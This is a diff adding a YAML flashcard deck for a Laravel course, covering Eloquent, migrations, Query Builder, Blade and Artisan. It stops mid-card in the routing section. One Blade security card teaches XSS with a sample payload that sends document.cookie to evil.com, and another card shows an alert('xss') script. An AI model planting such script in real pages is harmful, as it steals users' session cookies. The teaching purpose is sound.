@@ -1,0 +1,910 @@
+modules:
+  - id: laravel-database
+    name: Laravel Database
+    topics:
+      - id: eloquent-orm
+        name: Eloquent ORM
+        tags:
+          - eloquent
+          - orm
+          - laravel
+          - database
+        prose: >-
+          Eloquent ORM is Laravel's object-relational mapper. Each model class maps to a database table; methods like
+          all(), find(), findOrFail(), create(), and delete() translate PHP calls into SQL automatically.
+        cards:
+          - type: name
+            prompt: What Artisan command creates a Student model AND its migration in one step?
+            answer: php artisan make:model Student -m
+            explanation: >-
+              The -m flag generates the matching migration file alongside the model. Without it you would run make:model
+              and make:migration separately.
+            example: >-
+              Running `php artisan make:model Student -m` produces app/Models/Student.php and a file like
+              database/migrations/2024_03_21_000000_create_students_table.php.
+            source: laravel_with_students_MySQL_SCRIPT.docx
+            bloom: remember
+          - type: cloze
+            prompt: >-
+              To allow mass assignment on the FirstName and School columns, add `protected {{$fillable}} = ['FirstName',
+              'School'];` to the model.
+            answer: $fillable
+            explanation: >-
+              $fillable is a whitelist array on an Eloquent model. Only listed columns may be set through create() or
+              update(). Columns absent from the list are silently blocked, preventing attackers from setting fields like
+              is_admin.
+            example: >-
+              Without $fillable, calling Student::create($request->all()) throws a MassAssignmentException even if your
+              form only sends safe fields.
+            source: laravel_with_sqlite_API_SCRIPT.docx
+            bloom: remember
+          - type: name
+            prompt: Which Eloquent method returns a model instance or throws a 404 if the record does not exist?
+            answer: findOrFail()
+            explanation: >-
+              findOrFail() throws a ModelNotFoundException when the id is not found. Laravel automatically converts that
+              exception to an HTTP 404 response — you get safe error handling without writing an if-statement.
+            example: >-
+              `$student = Student::findOrFail($id);` — if id=99 does not exist, the user sees a 404 page rather than a
+              PHP error.
+            source: laravel_with_students_MySQL_SCRIPT.docx
+            bloom: understand
+          - type: cloze
+            prompt: >-
+              To fetch students filtered by School not null and sorted by FirstName, you write:
+              `Student::whereNotNull('School')->orderBy('FirstName')->{{get}}();`
+            answer: get
+            explanation: >-
+              Builder method chains on a model do not execute until you call ->get(). Without get(), you hold an
+              unresolved query object, not a Collection. Student::all() is the only read method that executes without a
+              terminal call.
+            example: >-
+              Student::where('School', 'Mining')->get() runs SELECT * FROM students WHERE School = 'Mining'. Omitting
+              ->get() returns a Builder, not data.
+            source: TIDBITS-components_config_db_SCRIPT.docx
+            bloom: apply
+          - type: name
+            prompt: >-
+              What is the correct way to insert a new Student when you already have an array of field values from a form
+              request?
+            answer: Student::create(['FirstName' => ..., 'LastName' => ..., 'School' => ...])
+            explanation: >-
+              create() accepts an associative array and executes an INSERT in one call. It requires $fillable to be
+              defined on the model — without it Laravel throws MassAssignmentException as a security guard.
+            example: >-
+              Student::create(['FirstName' => 'Ann', 'LastName' => 'Fox', 'School' => 'Business']) inserts one row and
+              returns the new Student instance.
+            source: laravel_with_students_MySQL_SCRIPT.docx
+            bloom: apply
+          - type: cloze
+            prompt: >-
+              After retrieving a student with findOrFail, you update its properties and call `$student->{{save}}()` to
+              persist changes.
+            answer: save
+            explanation: >-
+              save() works for both inserts (on a new Student instance) and updates (on an existing one). Eloquent
+              detects whether the model has a primary key set and issues INSERT or UPDATE accordingly.
+            example: >-
+              $student->FirstName = 'Tom'; $student->save(); — Eloquent runs UPDATE students SET FirstName='Tom' WHERE
+              id=X.
+            source: laravel_with_students_MySQL_SCRIPT.docx
+            bloom: apply
+          - type: name
+            prompt: >-
+              In the professor's data-access hierarchy, which pattern comes first: Eloquent ORM, Query Builder, or raw
+              SQL?
+            answer: Eloquent ORM
+            explanation: >-
+              The professor explicitly orders patterns as Eloquent first, Query Builder second, raw SQL third. Eloquent
+              is preferred because it is readable, relationship-aware, and ties closely to the model layer. Query
+              Builder and raw SQL are fallbacks for complex or vendor-specific queries.
+            example: >-
+              Use Student::all() before reaching for DB::table('students')->get(), and reach for DB::select() only as a
+              last resort.
+            source: TIDBITS-components_config_db_SCRIPT.docx
+            bloom: understand
+          - type: cloze
+            prompt: >-
+              `Student::{{all}}()` fetches every row; it cannot be followed by a ->where() filter that runs at the SQL
+              level.
+            answer: all
+            explanation: >-
+              Student::all() immediately executes SELECT * and returns a Collection in PHP memory. Chaining ->where()
+              after it filters the in-memory Collection in PHP, not at the database. For SQL-level filtering, use
+              Student::where(...)->get().
+            example: >-
+              Student::all()->where('School', 'Mining') loads all 10,000 students into PHP first, then discards most of
+              them. Student::where('School', 'Mining')->get() sends one efficient SQL query.
+            source: TIDBITS-components_config_db_SCRIPT.docx
+            bloom: analyze
+          - type: name
+            prompt: Which interactive Artisan REPL lets you test Eloquent queries without writing a controller?
+            answer: tinker
+            explanation: >-
+              php artisan tinker opens a REPL with full Laravel context. You can call any Eloquent method directly —
+              Student::all(), new Student(), save() — and see results instantly. It is the professor's recommended tool
+              for verifying model behavior.
+            example: >-
+              In tinker: `\App\Models\Student::all()` returns the full collection; `$s = new \App\Models\Student();
+              $s->FirstName='Joe'; $s->save();` inserts a row.
+            source: laravel_with_students_MySQL_SCRIPT.docx
+            bloom: remember
+          - type: name
+            prompt: >-
+              A Student record exists with id=5. What does Student::find(5) return versus Student::find(999) when 999
+              does not exist?
+            answer: find(5) returns the Student model instance; find(999) returns null
+            explanation: >-
+              find() returns the model or null — it never throws. Use findOrFail() when a missing record should be a
+              404. Use find() when you need to handle the null case yourself, for example to return a custom JSON error
+              message.
+            example: if (!$student = Student::find($id)) { return response()->json(['message' => 'Not found'], 404); }
+            source: laravel_with_sqlite_API_SCRIPT.docx
+            bloom: analyze
+      - id: model-relationships
+        name: Eloquent Relationships
+        tags:
+          - eloquent
+          - relationships
+          - laravel
+        prose: >-
+          Eloquent's hasMany() and belongsTo() declare a one-to-many relationship between two models. Declaring them
+          once unlocks relationship-aware querying, creation, and ownership checks throughout your controllers.
+        cards:
+          - type: name
+            prompt: >-
+              What Eloquent method do you add to the parent model (e.g. User) to declare it has many child records (e.g.
+              Org)?
+            answer: hasMany()
+            explanation: >-
+              hasMany() is placed on the parent side of a one-to-many relationship. It tells Eloquent to look for a
+              foreign key on the child table named after the parent model (e.g. user_id on the orgs table).
+            example: public function orgs() { return $this->hasMany(Org::class); }
+            source: auth-with-breeze_SQLite_SCRIPT.docx §Eloquent Relationships
+            bloom: remember
+          - type: name
+            prompt: >-
+              What Eloquent method do you add to the child model (e.g. Org) to declare it belongs to a parent (e.g.
+              User)?
+            answer: belongsTo()
+            explanation: >-
+              belongsTo() is placed on the child side. It lets you traverse from a child record up to its parent:
+              $org->user returns the related User model. The method name should be singular (user, not users).
+            example: public function user() { return $this->belongsTo(User::class); }
+            source: auth-with-breeze_SQLite_SCRIPT.docx §Eloquent Relationships
+            bloom: remember
+          - type: cloze
+            prompt: >-
+              To fetch all orgs for the currently logged-in user via the relationship chain, you write:
+              {{Auth::user()->orgs()}}->latest('updated_at')->get();
+            answer: Auth::user()->orgs()
+            explanation: >-
+              Auth::user() returns the authenticated User model. Calling orgs() on it (with parentheses) returns a query
+              builder scoped to that user's orgs via the hasMany relationship. You can chain further constraints before
+              calling get().
+            example: $orgs = Auth::user()->orgs()->latest('updated_at')->get();
+            source: auth-with-breeze_SQLite_SCRIPT.docx §Query & Save relationships
+            bloom: apply
+          - type: cloze
+            prompt: >-
+              The whereBelongsTo() shorthand for fetching the current user's orgs is:
+              Org::{{whereBelongsTo(Auth::user())}}->latest('updated_at')->get();
+            answer: whereBelongsTo(Auth::user())
+            explanation: >-
+              whereBelongsTo() filters a query to records whose foreign key matches the given model instance. It is the
+              most readable form and requires the belongsTo relationship to be declared on Org. It replaces
+              Org::where('user_id', Auth::id()).
+            example: $orgs = Org::whereBelongsTo(Auth::user())->latest('updated_at')->get();
+            source: auth-with-breeze_SQLite_SCRIPT.docx §Query & Save relationships
+            bloom: apply
+          - type: name
+            prompt: In the ownership check pattern, what method compares two Eloquent model instances by primary key?
+            answer: is()
+            explanation: >-
+              is() returns true when two model instances have the same primary key value. Used as:
+              $org->user->is(Auth::user()). This is the canonical way to verify a resource belongs to the current user
+              before allowing show/edit/delete.
+            example: if (!$org->user->is(Auth::user())) { return abort(403); }
+            source: auth-with-breeze_SQLite_SCRIPT.docx §Query & Save relationships
+            bloom: understand
+          - type: cloze
+            prompt: >-
+              When creating a new org through the relationship, you write Auth::user()->orgs()->{{create([...])}} — this
+              automatically sets the {{user_id}} foreign key.
+            answer: create([...]); user_id
+            explanation: >-
+              Calling create() on a relationship query builder automatically injects the parent's primary key as the
+              foreign key value. You never need to pass user_id manually. The Org model's $fillable array must still
+              list all other attributes.
+            example: Auth::user()->orgs()->create(['orgName' => $request->orgName, ...]);
+            source: auth-with-breeze_SQLite_SCRIPT.docx §Query & Save relationships
+            bloom: apply
+          - type: name
+            prompt: >-
+              What migration column declaration creates the user_id foreign key with a referential constraint on the
+              users table?
+            answer: $table->foreignId('user_id')->constrained()
+            explanation: >-
+              foreignId() creates an unsigned big integer column. constrained() adds the foreign key constraint that
+              references the id column of the users table (inferred from the column name). Without this, relationship
+              queries return empty results with no error.
+            example: Schema::create('orgs', function (Blueprint $table) { $table->foreignId('user_id')->constrained(); });
+            source: auth-with-breeze_SQLite_SCRIPT.docx §Database Model
+            bloom: remember
+          - type: name
+            prompt: >-
+              What is the key difference between accessing $org->user (property) vs $org->user() (method call) on an
+              Eloquent model?
+            answer: Property returns a cached model; method returns a query builder you can chain.
+            explanation: >-
+              Accessing a relationship as a property (no parentheses) triggers lazy loading and returns the related
+              model or collection directly. Calling it as a method (with parentheses) returns a query builder, allowing
+              you to chain where(), latest(), paginate(), etc. Using the property form and then chaining query methods
+              causes a fatal error.
+            example: |-
+              $org->user           // returns User model (cached)
+              $org->user()->first() // query builder form
+            source: auth-with-breeze_SQLite_SCRIPT.docx §Query & Save relationships
+            bloom: understand
+      - id: migrations-and-seeders
+        name: Migrations and Seeders
+        tags:
+          - laravel
+          - migrations
+          - seeders
+          - database-schema
+        prose: >-
+          Migrations are PHP classes that define and version your database schema. Seeders populate tables with sample
+          data. Together they let you rebuild a clean, consistent database with a single Artisan command.
+        cards:
+          - type: cloze
+            prompt: >-
+              To create a Student model and its migration at the same time, run: `php artisan make:model Student
+              {{-m}}`.
+            answer: '-m'
+            explanation: >-
+              The -m flag tells Artisan to generate a migration file alongside the model. Without it you only get the
+              model class and must create the migration separately.
+            example: >-
+              Running `php artisan make:model Student -m` produces `app/Models/Student.php` and a timestamped file in
+              `database/migrations/`.
+            source: laravel_with_students_MySQL_SCRIPT.docx
+            bloom: remember
+          - type: cloze
+            prompt: 'To apply all pending migrations to the database, run: `php artisan {{migrate}}`.'
+            answer: migrate
+            explanation: >-
+              Laravel compares each migration file's timestamp against the `migrations` table in the database and runs
+              only the files that have not been applied yet.
+            example: >-
+              After adding `$table->string('School');` to a new migration file, `php artisan migrate` creates the column
+              in the live database.
+            source: laravel_with_students_MySQL_SCRIPT.docx
+            bloom: remember
+          - type: cloze
+            prompt: >-
+              The command `php artisan migrate:refresh {{--seed}}` drops all tables, re-runs every migration, and then
+              runs all registered seeders.
+            answer: '--seed'
+            explanation: >-
+              The --seed flag causes Artisan to call DatabaseSeeder::run() after the refresh completes. Without it,
+              migrate:refresh only rebuilds the schema with no data.
+            example: >-
+              During development, `php artisan migrate:refresh --seed` resets the students table and repopulates it via
+              StudentSeeder.
+            source: laravel_with_students_MySQL_SCRIPT.docx; laravel_with_sqlite_API_SCRIPT.docx
+            bloom: remember
+          - type: name
+            prompt: >-
+              A PHP class in `database/migrations/` with `up()` and `down()` methods that defines a database schema
+              change — what is it called?
+            answer: A migration
+            explanation: >-
+              Migrations version your schema the same way git versions code. The `up()` method applies the change;
+              `down()` reverses it, enabling rollback.
+            example: >-
+              `Schema::create('students', function (Blueprint $table) { $table->id(); $table->string('FirstName'); });`
+              is a typical `up()` body.
+            source: laravel_with_students_MySQL_SCRIPT.docx
+            bloom: understand
+          - type: name
+            prompt: Which Artisan command creates a new seeder class file in `database/seeders/`?
+            answer: '`php artisan make:seeder StudentSeeder`'
+            explanation: >-
+              The generated class has an empty `run()` method where you write the insert logic. It does nothing until
+              you register it in DatabaseSeeder and run `db:seed` or `migrate:refresh --seed`.
+            example: >-
+              `php artisan make:seeder StudentSeeder` produces `database/seeders/StudentSeeder.php` with a `run(): void`
+              stub.
+            source: laravel_with_students_MySQL_SCRIPT.docx
+            bloom: remember
+          - type: name
+            prompt: >-
+              In `DatabaseSeeder.php`, what method call registers a custom seeder so it runs automatically during `php
+              artisan migrate:refresh --seed`?
+            answer: '`$this->call(StudentSeeder::class);`'
+            explanation: >-
+              DatabaseSeeder is the entry point for all seeding. Without this registration, your custom seeder never
+              fires even if the file exists.
+            example: >-
+              Adding `$this->call(StudentSeeder::class);` inside DatabaseSeeder's `run()` method means StudentSeeder
+              fires every time you seed.
+            source: laravel_with_students_MySQL_SCRIPT.docx; laravel_with_sqlite_API_SCRIPT.docx
+            bloom: understand
+          - type: cloze
+            prompt: >-
+              A migration's `{{up()}}` method defines the schema change to apply, while its `{{down()}}` method defines
+              how to reverse it.
+            answer: up(), down()
+            explanation: >-
+              Laravel uses `down()` when you roll back a migration. Without a correct `down()`, rollback either fails or
+              leaves orphan tables.
+            example: A `down()` that calls `Schema::dropIfExists('students')` cleanly removes the table on rollback.
+            source: laravel_with_students_MySQL_SCRIPT.docx
+            bloom: understand
+          - type: predict
+            lang: php
+            prompt: What table does this migration create, and which columns does it add beyond the defaults?
+            code: |
+              Schema::create('students', function (Blueprint $table) {
+                  $table->id();
+                  $table->string('FirstName');
+                  $table->string('LastName');
+                  $table->string('School');
+                  $table->timestamps();
+              });
+            answer: >-
+              Creates the `students` table with columns: `id` (auto-increment PK), `FirstName` (VARCHAR 255), `LastName`
+              (VARCHAR 255), `School` (VARCHAR 255), `created_at`, and `updated_at`. The developer added FirstName,
+              LastName, School; the rest come from the builder helpers.
+            explanation: >-
+              `$table->id()` and `$table->timestamps()` are always present in the scaffold. You only write the
+              domain-specific columns like FirstName, LastName, School.
+            source: laravel_with_students_MySQL_SCRIPT.docx
+            bloom: apply
+      - id: query-builder-and-raw-sql
+        name: Query Builder and Raw SQL
+        tags:
+          - laravel
+          - query-builder
+          - raw-sql
+        prose: >-
+          Laravel offers three data-access patterns in explicit preference order: Eloquent ORM first, Query Builder
+          (DB::table()) second, raw SQL (DB::select()) third. Query Builder chains fluent methods and returns stdClass
+          objects; raw SQL takes a plain SQL string and also returns stdClass objects.
+        cards:
+          - type: cloze
+            prompt: >-
+              In the professor's preference hierarchy, the order from most to least preferred is {{Eloquent ORM}}, then
+              {{Query Builder}}, then {{raw SQL}}.
+            answer: Eloquent ORM, Query Builder, raw SQL
+            explanation: >-
+              The professor explicitly ranks these three patterns. Eloquent is preferred because it works with typed
+              model instances. Query Builder is second — it works without a model and chains fluently. Raw SQL is last —
+              it forces you to write and maintain SQL strings manually.
+            example: |
+              ```php
+              // 1st — Eloquent
+              $students = Student::all();
+              // 2nd — Query Builder
+              $students = DB::table('students')->get();
+              // 3rd — Raw SQL
+              $students = DB::select('SELECT * FROM students');
+              ```
+            source: TIDBITS-components_config_db_SCRIPT.docx
+            bloom: remember
+          - type: cloze
+            prompt: To start a Query Builder chain on the `students` table, you call {{DB::table('students')}}.
+            answer: DB::table('students')
+            explanation: >-
+              DB is the facade for Laravel's database layer. Calling DB::table('table_name') creates a query builder
+              instance for that table. You then chain select(), where(), orderBy(), and finish with get().
+            example: |
+              ```php
+              use Illuminate\Support\Facades\DB;
+              $rows = DB::table('students')->select(['FirstName', 'LastName'])->get();
+              ```
+            source: TIDBITS-components_config_db_SCRIPT.docx
+            bloom: remember
+          - type: name
+            prompt: >-
+              What terminal method must you call at the end of a Query Builder chain to actually execute the query and
+              receive results?
+            answer: '->get()'
+            explanation: >-
+              Every Query Builder method except get() returns the builder itself — the query is not sent to the database
+              until get() is called. Omitting get() leaves you with a Builder object, not a collection of rows.
+            example: |
+              ```php
+              // Without ->get(): returns a Builder object, not results
+              $q = DB::table('students')->whereNotNull('School');
+              // With ->get(): executes and returns a collection of stdClass objects
+              $students = DB::table('students')->whereNotNull('School')->get();
+              ```
+            source: TIDBITS-components_config_db_SCRIPT.docx
+            bloom: understand
+          - type: cloze
+            prompt: To execute a raw SQL query in Laravel, you call {{DB::select('SELECT * FROM students')}}.
+            answer: DB::select('SELECT * FROM students')
+            explanation: >-
+              DB::select() takes a raw SQL string and an optional array of parameter bindings. It returns an array of
+              stdClass objects. Unlike Query Builder, it gives you no fluent methods — you write the full SQL string
+              yourself.
+            example: |
+              ```php
+              // Plain raw SQL
+              $students = DB::select('SELECT * FROM students');
+
+              // With a parameterised binding (safe against SQL injection)
+              $students = DB::select('SELECT * FROM students WHERE School = ?', ['Mining']);
+              ```
+            source: TIDBITS-components_config_db_SCRIPT.docx
+            bloom: remember
+          - type: name
+            prompt: You want to add a WHERE School IS NOT NULL clause using Query Builder. Which method do you chain?
+            answer: '->whereNotNull(''School'')'
+            explanation: >-
+              whereNotNull() generates WHERE column IS NOT NULL in the query. It is one of many convenience methods on
+              the Query Builder that translate readable PHP calls into correct SQL clauses, reducing the chance of SQL
+              syntax errors.
+            example: |
+              ```php
+              $students = DB::table('students')
+                  ->select(['FirstName', 'LastName', 'School'])
+                  ->whereNotNull('School')
+                  ->orderBy('FirstName')
+                  ->get();
+              ```
+            source: TIDBITS-components_config_db_SCRIPT.docx
+            bloom: apply
+          - type: predict
+            lang: php
+            prompt: What type of objects does this Query Builder call return, and how does that differ from an Eloquent call?
+            code: |
+              $students = DB::table('students')
+                  ->select(['FirstName', 'LastName'])
+                  ->get();
+            answer: >-
+              Returns a collection of stdClass objects, not typed Student model instances. Eloquent's Student::all()
+              returns Student model objects with model methods; Query Builder's DB::table() returns generic stdClass
+              objects with no model methods.
+            explanation: >-
+              Because Query Builder does not know which Eloquent model the table belongs to, it cannot instantiate model
+              objects. You access properties the same way ($item->FirstName) but you cannot call model methods like
+              $item->save() or use relationships.
+            source: TIDBITS-components_config_db_SCRIPT.docx
+            bloom: understand
+          - type: name
+            prompt: >-
+              Which two methods on the DB facade let you log and then retrieve the actual SQL queries that Laravel sends
+              to the database?
+            answer: DB::enableQueryLog() and DB::getQueryLog()
+            explanation: >-
+              Call DB::enableQueryLog() before running queries to start recording. Then call DB::getQueryLog() after to
+              retrieve an array of the SQL strings and their bound parameter values. This is the primary debugging tool
+              when a query returns unexpected results.
+            example: |
+              ```php
+              DB::enableQueryLog();
+              $students = DB::table('students')->whereNotNull('School')->get();
+              print_r(DB::getQueryLog());
+              ```
+            source: TIDBITS-components_config_db_SCRIPT.docx
+            bloom: apply
+  - id: laravel-foundations
+    name: Laravel Foundations
+    topics:
+      - id: laravel-mvc-blade
+        name: MVC and Blade Templating
+        tags:
+          - laravel
+          - mvc
+          - blade
+          - views
+        prose: >-
+          Laravel enforces MVC separation through opinionated directory conventions. Blade is the PHP templating engine
+          built into Laravel — it replaces raw PHP in views with @-directives and the double-brace syntax for XSS-safe
+          output.
+        cards:
+          - id: mvc-blade-card-01
+            type: cloze
+            prompt: >-
+              In Laravel's MVC layout, controllers live in {{app/Http/Controllers/}}, models in {{app/Models/}}, and
+              views in {{resources/views/}}.
+            answer: app/Http/Controllers/, app/Models/, resources/views/
+            explanation: >-
+              Laravel is opinionated — putting code in the wrong directory causes the framework not to find it. The
+              directory layout enforces MVC role separation at the filesystem level.
+            example: >-
+              A `UserController.php` in `app/Http/Controllers/` calls `User::all()` from `app/Models/User.php` and
+              returns `view('users.index', compact('users'))`.
+            source: intro_to_laravel.pptx slide 3
+            bloom: remember
+          - id: mvc-blade-card-02
+            type: name
+            prompt: >-
+              What @-directive marks the injection point in a Blade parent layout where a child view's content will be
+              inserted?
+            answer: '@yield(''name'')'
+            explanation: >-
+              @yield is the slot declaration in the parent. It pairs with @section in the child. The string argument
+              names the slot and must match exactly on both sides.
+            example: 'Parent: `@yield(''content'')`. Child: `@section(''content'') <h1>Hello</h1> @endsection`.'
+            source: intro_to_laravel.pptx slides 18–19
+            bloom: remember
+          - id: mvc-blade-card-03
+            type: cloze
+            prompt: >-
+              A child Blade view uses {{@extends('layouts.master')}} to inherit a layout and {{@section('content')}} ...
+              {{@endsection}} to define its content block.
+            answer: '@extends(''layouts.master''), @section(''content''), @endsection'
+            explanation: >-
+              @extends triggers layout loading. @section opens the named block. @endsection closes it. Omitting
+              @endsection causes a Blade parse error.
+            example: '`@extends(''layouts.master'')` loads `resources/views/layouts/master.blade.php`.'
+            source: intro_to_laravel.pptx slides 18–19; intro_to_laravel_SCRIPT.docx §Creating your own blade template
+            bloom: remember
+          - id: mvc-blade-card-04
+            type: name
+            prompt: >-
+              Which double-brace syntax escapes HTML entities and is therefore XSS-safe — `{{ $var }}` or `{!! $var
+              !!}`?
+            answer: '{{ $var }}'
+            explanation: >-
+              `{{ }}` calls htmlspecialchars() internally, converting `<`, `>`, and `&` to HTML entities. `{!! !!}`
+              outputs raw HTML and bypasses this protection entirely.
+            example: >-
+              `{{ "<script>alert('xss')</script>" }}` renders as visible text. `{!! "<script>alert('xss')</script>" !!}`
+              executes the script.
+            source: intro_to_laravel.pptx slide 25
+            bloom: understand
+          - id: mvc-blade-card-05
+            type: cloze
+            prompt: >-
+              Using {{'{!! $userInput !!}'}} without sanitizing $userInput creates an {{XSS}} vulnerability because
+              Blade outputs the value as {{raw HTML}}.
+            answer: '{!! $userInput !!}, XSS, raw HTML'
+            explanation: >-
+              XSS (cross-site scripting) lets attackers inject script tags that run in the victim's browser. Blade's `{{
+              }}` prevents this by escaping output. `{!! !!}` is opt-in and requires you to own or sanitize the content
+              first.
+            example: >-
+              An attacker sets their username to `<script>fetch('evil.com?c='+document.cookie)</script>`. Rendering it
+              with `{!! $user->name !!}` sends the user's cookies to the attacker.
+            source: intro_to_laravel.pptx slide 25; intro_to_laravel_SCRIPT.docx §Cross site scripting attack protection
+            bloom: understand
+          - id: mvc-blade-card-06
+            type: name
+            prompt: >-
+              Which @-directive embeds a reusable Blade template fragment (a partial view) at a given location in
+              another Blade file?
+            answer: '@include(''path.to.partial'')'
+            explanation: >-
+              @include inserts the partial view inline. The partial view receives all variables currently in scope.
+              Dot-notation maps to the directory path under `resources/views/`.
+            example: '`@include(''partials.header'')` loads `resources/views/partials/header.blade.php`.'
+            source: intro_to_laravel.pptx slide 20; intro_to_laravel_SCRIPT.docx §Partial views
+            bloom: remember
+          - id: mvc-blade-card-07
+            type: predict
+            lang: blade
+            prompt: What does this Blade snippet output if $id is 5?
+            code: |
+              @if($id == 5)
+                  <p>Secret!</p>
+              @endif
+              <ul>
+                  @foreach(['a','b'] as $item)
+                      <li>{{ $item }}</li>
+                  @endforeach
+              </ul>
+            answer: >-
+              Outputs `<p>Secret!</p>` followed by an unordered list with items `a` and `b`. When $id is not 5, the
+              paragraph is omitted.
+            explanation: >-
+              @if evaluates the condition and renders its block only when true. @foreach iterates the array. {{ }}
+              escapes each value before rendering.
+            source: intro_to_laravel.pptx slide 22; intro_to_laravel_SCRIPT.docx §Control structures
+            bloom: apply
+          - id: mvc-blade-card-08
+            type: cloze
+            prompt: >-
+              The Blade component `<x-master>` maps to the file {{resources/views/components/master.blade.php}}, and
+              named slots use the syntax {{<x-slot name='content'>}}.
+            answer: resources/views/components/master.blade.php, <x-slot name='content'>
+            explanation: >-
+              Blade components are the modern equivalent of @extends/@section. The `x-` prefix is the component tag
+              convention. Named slots allow multiple injection points in one component.
+            example: Inside the component file, `{{ $content }}` renders the slot — not `@yield('content')`.
+            source: TIDBITS-components_config_db_SCRIPT.docx §Blade Components
+            bloom: understand
+          - id: mvc-blade-card-09
+            type: name
+            prompt: In a Blade component file, how do you render the content passed via `<x-slot name='content'>`?
+            answer: '{{ $content }}'
+            explanation: >-
+              Blade components pass each named slot as a PHP variable. The slot name becomes the variable name. This
+              differs from the @yield pattern used in layout inheritance.
+            example: >-
+              Component file: `<div class='container'>{{ $content }}</div>`. Caller: `<x-master><x-slot
+              name='content'>Hello</x-slot></x-master>`.
+            source: TIDBITS-components_config_db_SCRIPT.docx §Blade Components
+            bloom: apply
+          - id: mvc-blade-card-10
+            type: name
+            prompt: >-
+              In Laravel MVC, which layer is responsible for querying the database — the Model, the View, or the
+              Controller?
+            answer: Model
+            explanation: >-
+              The View renders HTML only; it receives data from the controller. The Controller coordinates work but
+              delegates data access to the Model. Mixing database calls into views breaks MVC separation and makes code
+              hard to test.
+            example: >-
+              Controller: `$users = User::all(); return view('users.index', compact('users'));`. The view receives
+              `$users` as a variable — it never calls the database.
+            source: intro_to_laravel.pptx slides 3–5
+            bloom: understand
+          - id: mvc-blade-card-11
+            type: cloze
+            prompt: >-
+              A Blade comment uses the syntax {{'{{'}}{{-- ... --}}{{'}}'}} and is {{not sent to the browser}} in the
+              compiled HTML output.
+            answer: '{{-- ... --}}, not sent to the browser'
+            explanation: >-
+              HTML comments (`<!-- -->`) are visible in page source. Blade comments (`{{-- --}}`) are stripped at
+              compile time and never reach the browser — useful for notes that should not be public.
+            example: '`{{-- TODO: remove this before production --}}` leaves no trace in the rendered HTML.'
+            source: intro_to_laravel.pptx slide 24; intro_to_laravel_SCRIPT.docx §Comments in view blades
+            bloom: remember
+      - id: artisan-composer
+        name: Artisan CLI and Composer
+        tags:
+          - artisan
+          - composer
+          - cli
+          - laravel
+        prose: >-
+          Composer creates and manages Laravel projects; Artisan is Laravel's built-in CLI for scaffolding files,
+          running the server, and managing the app lifecycle. Every Artisan command uses the `php artisan` prefix with
+          colon-separated subcommands.
+        cards:
+          - type: name
+            prompt: What single Artisan command creates a new Eloquent model AND its database migration at the same time?
+            answer: php artisan make:model ModelName -m
+            explanation: >-
+              The `-m` flag tells Artisan to generate a matching migration alongside the model file. Without it you get
+              only the model and must run `make:migration` separately.
+            example: >-
+              `php artisan make:model Student -m` produces `app/Models/Student.php` and a timestamped migration in
+              `database/migrations/`.
+            source: laravel_with_sqlite_API_SCRIPT.docx
+            bloom: remember
+          - type: cloze
+            prompt: >-
+              Artisan scaffold commands use a {{colon}} separator, not a hyphen — for example, `php artisan
+              {{make:migration}} create_students_table`.
+            answer: colon; make:migration
+            explanation: >-
+              Laravel's command namespaces are colon-delimited (`make:migration`, `make:controller`, `make:model`). The
+              hyphen form is a common distractor on the exam and does not exist.
+            example: >-
+              final-practice.docx Q6: option (b) `php artisan make:migration user-table` is correct; option (c) `php
+              artisan make-migration user-table` is wrong.
+            source: intro_to_laravel.pptx slide 10; final-practice.docx Q6
+            bloom: remember
+          - type: name
+            prompt: >-
+              Which Artisan command opens an interactive REPL that lets you query Eloquent models directly in the
+              terminal?
+            answer: php artisan tinker
+            explanation: >-
+              Tinker boots the full Laravel application in a REPL so you can run Eloquent queries, test relationships,
+              and inspect data without writing a controller or opening a browser.
+            example: >-
+              After running `php artisan tinker`, you can type `\App\Models\Student::all()` to see all rows in the
+              students table.
+            source: Week9 - Table of Contents.html
+            bloom: understand
+          - type: cloze
+            prompt: >-
+              To scaffold a controller with all seven RESTful methods (index, create, store, show, edit, update,
+              destroy), you run `php artisan make:controller Name {{--resource}}`.
+            answer: '--resource'
+            explanation: >-
+              The `--resource` flag tells Artisan to pre-populate the controller with all standard RESTful method stubs.
+              Without it, the controller is generated empty.
+            example: >-
+              `php artisan make:controller api/StudentsController --resource` creates a controller with all 7
+              CRUD-mapped methods ready to fill in.
+            source: laravel_with_sqlite_API_SCRIPT.docx
+            bloom: remember
+          - type: name
+            prompt: >-
+              You edited `.env` to change the database name, but Laravel is still connecting to the old database. Which
+              Artisan command clears the cached configuration?
+            answer: php artisan config:clear
+            explanation: >-
+              Laravel caches configuration for performance. When you change `.env` or any file under `config/`, run `php
+              artisan config:clear` to force Laravel to re-read the updated values.
+            example: Run `php artisan config:clear` after changing `DB_DATABASE` in `.env`, then restart the server.
+            source: intro_to_laravel.pptx slide 10
+            bloom: understand
+          - type: name
+            prompt: What is the Composer command to create a brand-new Laravel project in a folder called `my-app`?
+            answer: composer create-project laravel/laravel my-app
+            explanation: >-
+              Composer downloads the Laravel skeleton and all dependencies into `my-app/`. The `vendor/` folder it
+              creates is git-ignored; teammates restore it with `composer install`.
+            example: >-
+              Running `composer create-project laravel/laravel laravel-rocks` followed by `php artisan serve
+              --port=8888` gives you a working app at `http://localhost:8888`.
+            source: intro_to_laravel.pptx slide 6; intro_to_laravel_SCRIPT.docx
+            bloom: remember
+          - type: cloze
+            prompt: >-
+              After cloning a Laravel repo where `vendor/` is missing, you restore all dependencies with `{{composer
+              install}}`.
+            answer: composer install
+            explanation: >-
+              `composer install` reads `composer.json` and downloads every listed package. `composer create-project` is
+              only for initial project creation, not restoration.
+            example: >-
+              `vendor/` is in `.gitignore` by default; `composer install` is the standard onboarding step for any cloned
+              Laravel project.
+            source: intro_to_laravel_SCRIPT.docx
+            bloom: understand
+          - type: name
+            prompt: Which Artisan command drops all tables, runs every migration fresh, and then runs all seeders?
+            answer: php artisan migrate:refresh --seed
+            explanation: >-
+              `migrate:refresh` rolls back then re-applies every migration. The `--seed` flag then invokes all database
+              seeders, giving you a clean populated database in one step.
+            example: >-
+              Use `php artisan migrate:refresh --seed` during development whenever you change a migration and need
+              sample data rebuilt from scratch.
+            source: laravel_with_sqlite_API_SCRIPT.docx
+            bloom: remember
+      - id: laravel-routing-controllers
+        name: Routes and Resource Controllers
+        tags:
+          - laravel
+          - routing
+          - controllers
+        prose: >
+          Laravel's resource routing maps HTTP verbs to controller methods by convention. Route::apiResource() registers
+          five endpoints with one line, binding GET/POST/PUT/DELETE to index, store, show, update, and destroy.
+          Middleware chains protect routes; route caching optimises production performance but must be cleared after
+          every routing change.
+        cards:
+          - id: routing-card-01
+            type: cloze
+            prompt: >
+              To register all five RESTful API routes for a StudentsController in one line, write:
+              {{Route::apiResource('students', StudentsController::class)}}.
